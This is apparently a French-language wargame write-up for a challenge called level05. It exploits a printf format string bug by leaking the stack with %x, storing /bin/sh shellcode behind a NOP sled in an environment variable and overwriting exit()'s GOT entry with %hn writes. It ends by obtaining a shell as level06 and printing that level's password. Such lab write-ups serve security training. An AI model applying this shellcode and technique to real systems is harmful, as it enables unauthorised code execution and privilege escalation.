Il y a un appel fgets (), stocké dans l'entrée sur un buffer de 100 caractères. Une boucle sur le buffer pour transformer l'entrée en minuscules.
A la fin, il y a un appel à printf() avec le buffer comme paramètre, c'est une chaîne de charactere.

Essayons: 
python -c 'print "BBBB"+"-%x"*12' | ./level05 
bbbb-64-f7fcfac0-f7ec3af9-ffffd5ff-ffffd5fe-0-ffffffff-ffffd684-f7fdb000-62626262-2d78252d-252d7825

Ca fonctionne et notre string "BBBB" = "62626262" est à la 10ème position.

Pour l'exploiter, on peut stocker un shellcode dans une variable env et l'injecter en 10ème position avec la chaîne de caractere.

env -i exploit=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
nopsled -> 0xffffdd07

Il nous faut maintenant l'adresse de exit() pour overwrite la GOT.

(gdb) info function exit
-> 0x80497e0

On doit écrire dans l'adresse GOT en 2 fois car 0xffffdd31 = 4294958385 ce qui est trop long pour l'écrire en une fois.

dd31 = 56625 - 8 pour les 2 adresses d'avant -> 56617
ffff = 65535 - tout les caractères d'avant (56625) -> 8910

python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%56617d%10$hn" + "%8910d%11$hn"' > /tmp/exploit
cat /tmp/exploit - | env -i exploit=$(python -c 'print "\x90"*1000+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"') ./level05
whoami
level06
cat ~level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq